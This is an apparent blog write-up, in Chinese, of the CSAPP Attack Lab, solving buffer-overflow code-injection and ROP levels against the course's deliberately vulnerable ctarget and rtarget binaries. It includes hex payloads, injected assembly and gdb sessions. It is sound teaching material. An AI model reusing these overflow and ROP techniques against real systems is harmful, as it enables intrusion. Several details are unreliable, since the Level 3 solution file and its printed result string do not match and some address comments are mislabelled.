---
title: 深入理解计算机系统（CSAPP）实验三 Attack Lab
date: 2018-05-10 16:08:06
tags: 
	- C/C++
	- CSAPP
categories: 计算机系统
---

## 准备工作

深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。

实验提供了五个文件，其作用如下：

- ctarget：用来做代码注入攻击的程序
- rtarget: 用来做 ROP 攻击的程序 
- cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 
- farm.c: 用来找寻 gadget 的源文件 
- hex2raw: 用来生成攻击字符串的程序

<!-- more -->

## Part I: Code Injection Attacks

这一部分有三个phase，我们用特定的字符串攻击ctarget程序。 

### Level 1 

Level 1不需要我们注入新的代码，但是需要输入的字符串使程序执行一个已有的代码段（不是正常执行的代码）。ctarget中的test调用一个getbuf函数，用于从控制台输入字符串.

test函数C代码如下：

```C++
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}
```

getbuf的C代码如下：

```C++
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

当getbuf执行完毕时，程序会返回test函数中，但是我们需要改变这个行为，使getbuf函数执行完毕后返回touch1函数：

```C++
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

实验提供了一些建议：

- 本关所需要的所有信息都可以在 ctarget 的汇编代码中找到
- 具体要做的是把 touch1 的开始地址放到 ret 指令的返回地址中
- 注意字节的顺序
- 可以用 gdb 在 getbuf 的最后几条指令设置断点，来看程序有没有完成所需的功能
- 具体 buf 在栈帧中的位置是由 BUFFER_SIZE 决定的，需要检查汇编代码来查看具体位置

从上述建议中我们知道，先将ctarget反汇编再查看具体代码就能解决完成这个攻击，具体步骤如下：

1)  查看getbuf的反汇编代码：

```
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
```

分析getbuf的C代码和汇编代码可以看出BUFFER_SIZE是rsp移动的位置-0x28，也就是40位。

2)  查看touch1的反汇编代码：

```
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

touch1的入口地址是0x4017c0。

3)  设置导致溢出的字符串：

知道了BUFFER_SIZE的大小和touch1的入口地址，我们可以制造缓冲区溢出攻击，也就是输入一个大小大于40位的字符串，将buf填满的同时，把touch1函数的入口地址覆盖getbuf原有的返回地址，这样getbuf返回时就会执行touch1函数。于是设置字符串如下：

```
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
c0 17 40 00 
```

​	保存到文件phase1.txt中

4)  将字符串转化为字节码：

使用hex2raw工具将phase1.txt转化为字节码，保存到文件phase1_input.txt中：

```
hex2ram < phase1.txt > phase1_input.txt
```

5)  再执行ctarget，查看结果：

使用如下命令测试，同时查看结果：

```
./ctarget -qi phase1_input.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

Level 1通过。 

### Level 2

Level 2需要插入一小段代码。ctarget中有一小段程序touch1，其C代码如下：

```C++
void touch2(unsigned val){
    vlevel = 2;  /* Part of validation protocol */
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

我们的任务同样是让ctarget程序执行touch2而不是返回test，但是touch2函数需要传入一个参数，且实验要求这个参数是是我们的Cookie，上一个phase已经知道Cookie：0x59b997fa。实验也提供了一些建议：

- 使用ret指令调用touch2函数
- touch2的参数要存在rdi寄存器中
- 插入的代码应该设置寄存器存着Cookie，然后再返回touch2
- 不用jmp和call指令
- 使用gcc和objdump生成要插入代码的字节码格式

具体步骤如下：

1)  查看touch2的入口地址：

```
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
```

touch2的入口地址位0x4017ec

2)  需要注入的代码：

```
mov $0x59b997fa,%rdi  # rdi = My Cookie = 0x59b997fa
pushq $0x4017ec
ret
```

3)  生成机器码 

```
gcc -c phase2.s -o phase2.o
objdump -d phase2.o> phase2.d
```

查看phase2.d如下所示：

```
phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

可以看出这一段程序的机器码为：

```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
```

4)  生成字节码并注入程序

注入过程可以类似Level 1，但是这回不是返回touch2的入口地址，而是需要返回我们要注入的这段程序。其实把这段程序当作getbuf输入的字符，输入进getbuf函数的栈帧中，再使用缓冲区溢出的方法，将ret的返回地址设置为缓冲区的入口地址即可：

```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
(gdb) break *0x4017b4
Breakpoint 1 at 0x4017b4: file buf.c, line 16.
(gdb) run -q
Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -q
Cookie: 0x59b997fa
Type string:1111

Breakpoint 1, getbuf () at buf.c:16
16      buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
=> 0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
(gdb) print $rsp
$1 = (void *) 0x5561dc78
```

由上可知：缓冲区地址为0x5561dc78，按照Level 1的做法，把这个地址放在第41到44个字节的位置（小端模式），生成输入字符如下：

```
48 c7 c7 fa 
97 b9 59 68 
ec 17 40 00 
c3 00 00 00
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

存入文件phase2.txt中，再使用hex2ram生成字节码：

```
hex2ram < phase2.txt > phase2_input.txt
```

5)  再执行ctarget，查看结果：

使用如下命令测试，同时查看结果：

```
./ctarget -qi phase2_input.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

Level 2通过。 

### Level 3

Level 3类似与Level 2，也是需要插入一段代码，是程序运行touch3，而不是返回test。但是这一关多了一个函数hexmatch，两段C程序代码如下： 

```C++
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

同时，不像Level 2，这一关将Cookie的字符串地址作为参数传入touch3函数。首先将Cookie转化为ASCII码形式，如下：

```
0x59b997fa >> 35 39 62 39 39 37 66 61 
```

使用Level 2的方式进入touch3，查看hexmatch函数改动的缓冲区数据，将上述ASCII码插入正确的缓冲区即可：

phase3.s：

```
mov $0x59b997fa,%rdi  # rdi = My Cookie = 0x59b997fa

pushq $0x4018fa        # touch3的入口地址

ret
```

phase3.txt：

```
48 c7 c7 fa 
97 b9 59 68 
fa 18 40 00 
c3 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

```
./hex2raw < phase3.txt > phase3_input.txt
gdb ctarget
(gdb) break touch3
Breakpoint 1 at 0x4018fa: file visible.c, line 71.
(gdb) run -qi phase3_input.txt
Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -qi phase3_input.txt
Cookie: 0x59b997fa

Breakpoint 1, touch3 (
    sval=0x59b997fa <error: Cannot access memory at address 0x59b997fa>)
    at visible.c:71
71      visible.c: No such file or directory.
(gdb) disas
Dump of assembler code for function touch3:
=> 0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    %rbx,%rdx
   0x000000000040191d <+35>:    mov    $0x403138,%esi
   0x0000000000401922 <+40>:    mov    $0x1,%edi
   0x0000000000401927 <+45>:    mov    $0x0,%eax
   0x000000000040192c <+50>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    $0x3,%edi
   0x0000000000401936 <+60>:    callq  0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    %rbx,%rdx
---Type <return> to continue, or q <return> to quit---
   0x0000000000401940 <+70>:    mov    $0x403160,%esi
   0x0000000000401945 <+75>:    mov    $0x1,%edi
   0x000000000040194a <+80>:    mov    $0x0,%eax
   0x000000000040194f <+85>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    $0x3,%edi
   0x0000000000401959 <+95>:    callq  0x401d4f <fail>
   0x000000000040195e <+100>:   mov    $0x0,%edi
   0x0000000000401963 <+105>:   callq  0x400e40 <exit@plt>
End of assembler dump.
```

在0x0000000000401916 <+28>:处设置断点，continue后查看缓冲区数据： 

```
(gdb) break touch3
Breakpoint 1 at 0x4018fa: file visible.c, line 71.
(gdb) run
Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget
FAILED: Initialization error: Running on an illegal host [minimips-work]
[Inferior 1 (process 91489) exited with code 010]
(gdb) run -qi phase3_input.txt
Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -qi phase3_input.txt
Cookie: 0x59b997fa

Breakpoint 1, touch3 (sval=0x606010 "\210$\255", <incomplete sequence \373>)
    at visible.c:71
71      visible.c: No such file or directory.
(gdb) break *0x40190b
Breakpoint 2 at 0x40190b: file visible.c, line 73.
(gdb) break *0x401916
Breakpoint 3 at 0x401916: file visible.c, line 73.
(gdb) continue
Continuing.

Breakpoint 2, 0x000000000040190b in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73      in visible.c
 (gdb) x/20x 0x5561dc78 # 在调用hexmatch之前缓冲区不变
0x5561dc78:     0x4018fa68      0x0000c300      0x00000000      0x00000000
0x5561dc88:     0x00000000      0x00000000      0x00000000      0x00000000
0x5561dc98:     0x00000000      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
(gdb) continue
Continuing.

Breakpoint 3, 0x0000000000401916 in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73      in visible.c
(gdb) x/20x 0x5561dc78 # 在调用hexmatch之后缓冲区发生改变
0x5561dc78:     0x6dc03400      0x181c2db5      0x00606010      0x00000000
0x5561dc88:     0x55685fe8      0x00000000      0x00000003      0x00000000
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
```

观察发现缓冲区被覆盖了，所以不能把Cookie的ASCII码放在缓冲区开头，可以放在0x5561dca8处的0x00401f24之后，有足够的空间存放，最终phase3.txt如下：

```
48 c7 c7 fa 97 b9 59 68 
fa 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
35 39 62 39 39 37 66 61 
78 dc 61 55 00 00 00 00 
09 00 00 00 00 00 00 00 
24 1f 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
```

使用如下命令测试，同时查看结果： 

```
./hex2raw < phase3.txt > phase3_input.txt
./ctarget -qi phase3_input.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 3030 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

Level 3通过。 

## Part II: Return-Oriented Programming

这一部分攻击rtarget程序，但是这个程序使用了两种技术防止代码注入攻击：

- 每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址
- 即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误

所以只能利用已有的可执行的代码，来完成我们的操作，称为`retrun-oriented programming(ROP)`，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令ret，每次return相当于从一个gadget跳转到另一个gadget中，然后通过这样不断跳转来完成我们想要的操作。

### Level 1

这一关要求我们重复上一部分Level 2的攻击，但是无法对rtarget进行代码注入攻击，我们只能使用ROP攻击：利用farm.c中的程序的gadget，构造我们需要的指令，在rtarget中执行，farm段的反汇编代码在下面这一部分：

```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   
……
0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```

使用如下几个gadget构造ROP程序： 

```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq 
```

使用如下地址： 

```
0x004017ec # touch2 的入口地址
0x004019a2 # 48 89 c7 movq %rax, %rdi
0x59b997fa # My cookie
0x004019ab # popq %rax
```

构造成的phase4.txt如下：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 
c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
```

使用如下命令测试，同时查看结果：

```
./hex2raw < phase4.txt > phase4_input.txt
./rtarget -qi phase4_input.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

Level 1通过。

### Level 2

这一关要求我们重复上一部分Level 3的攻击，使用ROP攻击的形式。

使用如下几个gadget构造ROP程序：

```
0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
```

使用如下地址： 

```
0x00401aad # 48 89 e0 movq %rsp, %rax
0x004019d8 # 04 37 add %0x37, %al
0x004019a2 # 48 89 c7 movq %rax, %rdi
0x004018fa # touch2 的入口地址
35 39 62 39 39 37 66 61 00 # My cookie ASCII
```

构造成的phase5.txt如下：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00 d8 19 40 00 00 00 00 00  
a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

使用如下命令测试，同时查看结果：

```
./hex2raw < phase5.txt > phase5_input.txt
./rtarget -qi phase5_input.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

Level 2通过。